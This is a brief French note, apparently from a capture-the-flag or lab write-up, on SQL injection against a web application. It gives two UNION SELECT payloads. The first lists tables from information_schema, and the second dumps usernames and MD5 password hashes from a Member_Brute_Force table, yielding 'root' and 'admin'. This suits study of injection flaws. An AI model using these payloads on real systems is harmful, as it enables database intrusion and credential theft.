Requete sql pour afficher toutes les tables
1 AND 1=2 UNION SELECT table_schema, table_name, 1 FROM information_schema.tables

On remarque qu'il y a une base qui s'apelle member_brute_force, et en utilisant cette requete:
-1 union select username, password from Member_Brute_Force.db_default
On obtient deux usernames (root et admin) ainsi que le password en md5
